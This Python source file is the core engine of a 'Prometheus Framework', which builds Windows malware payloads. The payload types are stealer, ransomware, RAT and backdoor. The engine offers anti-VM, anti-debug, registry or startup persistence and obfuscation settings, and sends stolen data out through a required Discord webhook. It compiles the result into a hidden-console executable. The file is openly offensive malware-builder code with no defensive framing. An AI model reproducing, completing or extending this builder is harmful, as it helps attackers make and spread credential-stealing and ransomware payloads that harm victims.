import os
import json
import logging
import tempfile
import base64
import secrets
from typing import Dict, Any, Optional, List
from pathlib import Path
from datetime import datetime

from .crypto import SecureStore, derive_key, encrypt_data, decrypt_data
from .utils import ensure_dir, get_os_name, get_timestamp, atomic_write
from .orchestrator import PayloadOrchestrator
from payload.compiler import PayloadCompiler
from modules.registry import ModuleRegistry


class Engine:
    """
    The core orchestration engine for the Prometheus Framework.
    Manages configuration, modules, and the payload generation pipeline.
    """

    def __init__(self, secure_store: Optional[SecureStore] = None):
        self.logger = logging.getLogger(__name__)
        self.secure_store = secure_store or SecureStore()
        self.module_registry = ModuleRegistry()
        self.orchestrator = PayloadOrchestrator()
        self.compiler = PayloadCompiler()

        # Configuration
        self.config = {
            "version": "1.0.0",
            "created": get_timestamp(),
            "updated": get_timestamp(),
            "webhook_url": "",
            "webhook_encrypted": "",
            "webhook_key": "",
            "payload_type": "full",
            "output_path": "output/payload.exe",
            "file_name": "payload",
            "icon_path": "",
            "modules": {},
            "module_configs": {},
            "obfuscation_level": "medium",  # none, low, medium, high
            "anti_vm": True,
            "anti_debug": True,
            "persistence": False,
            "startup_method": "registry",  # registry, schedule, startup_folder
            "self_destruct": False,
            "encrypted_communication": True,
            "telemetry": False,
        }

        self._load_config()
        self._load_modules()

    def _load_config(self):
        """Load configuration from file if it exists."""
        config_path = Path.home() / ".prometheus" / "config.json"
        if config_path.exists():
            try:
                with open(config_path, "r") as f:
                    data = json.load(f)
                    self.config.update(data)
                    self.logger.info(f"Loaded configuration from {config_path}")
            except Exception as e:
                self.logger.warning(f"Failed to load config: {e}")

    def _save_config(self):
        """Save configuration to file."""
        config_dir = Path.home() / ".prometheus"
        config_dir.mkdir(parents=True, exist_ok=True)
        config_path = config_dir / "config.json"
        try:
            atomic_write(config_path, json.dumps(self.config, indent=2))
            self.logger.info(f"Saved configuration to {config_path}")
        except Exception as e:
            self.logger.error(f"Failed to save config: {e}")

    def _load_modules(self):
        """Load all available modules from the modules directory."""
        self.module_registry.discover_modules()
        self.logger.info(f"Loaded {len(self.module_registry)} modules")

    def load_config(self, path: str):
        """Load configuration from a JSON file."""
        with open(path, "r") as f:
            data = json.load(f)
            self.config.update(data)
            self.logger.info(f"Loaded configuration from {path}")

    def save_config(self, path: Optional[str] = None):
        """Save configuration to a JSON file."""
        if path:
            atomic_write(path, json.dumps(self.config, indent=2))
        else:
            self._save_config()

    def set_webhook(self, webhook_url: str):
        """Set and encrypt the Discord webhook URL."""
        self.config["webhook_url"] = webhook_url
        # Encrypt the webhook for storage
        key = secrets.token_urlsafe(32)
        encrypted = encrypt_data(webhook_url, key)
        self.config["webhook_encrypted"] = encrypted
        self.config["webhook_key"] = key
        self._save_config()

    def get_webhook(self) -> str:
        """Get the decrypted webhook URL."""
        if self.config["webhook_encrypted"] and self.config["webhook_key"]:
            try:
                return decrypt_data(self.config["webhook_encrypted"], self.config["webhook_key"])
            except Exception:
                return self.config.get("webhook_url", "")
        return self.config.get("webhook_url", "")

    def set_payload_type(self, payload_type: str):
        """Set the payload type (stealer, ransomware, rat, backdoor, full)."""
        self.config["payload_type"] = payload_type

    def set_output_path(self, output_path: str):
        """Set the output file path."""
        self.config["output_path"] = output_path
        self.config["file_name"] = os.path.splitext(os.path.basename(output_path))[0]

    def enable_module(self, module_id: str, enabled: bool):
        """Enable or disable a module."""
        self.config["modules"][module_id] = enabled
        if module_id in self.config["module_configs"]:
            self.config["module_configs"][module_id]["enabled"] = enabled

    def is_module_enabled(self, module_id: str) -> bool:
        """Check if a module is enabled."""
        return self.config["modules"].get(module_id, False)

    def get_module_config(self, module_id: str) -> Dict[str, Any]:
        """Get configuration for a specific module."""
        return self.config["module_configs"].get(module_id, {})

    def set_module_config(self, module_id: str, config_data: Dict[str, Any]):
        """Set configuration for a specific module."""
        self.config["module_configs"][module_id] = config_data
        # Ensure enabled state is synced
        if "enabled" in config_data:
            self.config["modules"][module_id] = config_data["enabled"]
        self._save_config()

    def get_available_modules(self) -> Dict[str, Any]:
        """Get all available modules with their metadata."""
        return self.module_registry.get_manifest()

    def build(self) -> bool:
        """
        Execute the payload generation pipeline.
        Returns True on success, False on failure.
        """
        try:
            self.logger.info("Starting payload generation pipeline...")

            # 1. Validate configuration
            if not self._validate_config():
                self.logger.error("Configuration validation failed.")
                return False

            # 2. Prepare the payload context
            context = self._prepare_payload_context()

            # 3. Generate the payload script
            script_content = self.orchestrator.generate(context)

            # 4. Write the script to a temporary file
            with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
                f.write(script_content)
                script_path = f.name
            self.logger.debug(f"Generated script: {script_path}")

            # 5. Compile to executable if requested
            output_path = self.config["output_path"]
            if output_path.endswith(".exe") or output_path.endswith(".bin"):
                # Compile to EXE
                icon_path = self.config.get("icon_path", "")
                exe_path = self.compiler.compile(
                    script_path,
                    output_path,
                    icon=icon_path if icon_path else None,
                    onefile=True,
                    console=False,
                )
                if not exe_path:
                    self.logger.error("Compilation failed.")
                    return False
                self.logger.info(f"Executable generated: {exe_path}")
            else:
                # Just copy the script
                dest_path = output_path if output_path.endswith(".py") else output_path + ".py"
                os.rename(script_path, dest_path)
                self.logger.info(f"Script generated: {dest_path}")

            # 6. Clean up
            if os.path.exists(script_path) and script_path != output_path:
                os.unlink(script_path)

            self.logger.info("Payload generation completed successfully.")
            return True

        except Exception as e:
            self.logger.error(f"Build failed: {e}", exc_info=True)
            return False

    def _validate_config(self) -> bool:
        """Validate the current configuration."""
        webhook = self.get_webhook()
        if not webhook:
            self.logger.error("Webhook URL is required.")
            return False
        if not webhook.startswith("https://discord.com/api/webhooks/"):
            self.logger.warning("Webhook URL does not appear to be a valid Discord webhook.")
        return True

    def _prepare_payload_context(self) -> Dict[str, Any]:
        """Prepare the context for payload generation."""
        context = {
            "timestamp": get_timestamp(),
            "platform": "windows",  # Primary target
            "webhook": self.get_webhook(),
            "webhook_encrypted": self.config.get("webhook_encrypted", ""),
            "webhook_key": self.config.get("webhook_key", ""),
            "payload_type": self.config["payload_type"],
            "modules": self._get_enabled_modules(),
            "module_configs": self.config["module_configs"],
            "obfuscation_level": self.config.get("obfuscation_level", "medium"),
            "anti_vm": self.config.get("anti_vm", True),
            "anti_debug": self.config.get("anti_debug", True),
            "persistence": self.config.get("persistence", False),
            "startup_method": self.config.get("startup_method", "registry"),
            "self_destruct": self.config.get("self_destruct", False),
            "encrypted_communication": self.config.get("encrypted_communication", True),
        }
        return context

    def _get_enabled_modules(self) -> List[Dict[str, Any]]:
        """Get all enabled modules with their configurations."""
        enabled = []
        for module_id, config in self.module_registry.get_manifest().items():
            if self.is_module_enabled(module_id):
                module_config = self.get_module_config(module_id)
                enabled.append({
                    "id": module_id,
                    "name": config.get("name", module_id),
                    "category": config.get("category", "unknown"),
                    "config": module_config,
                    "template": self.module_registry.get_template(module_id),
                })
        return enabled
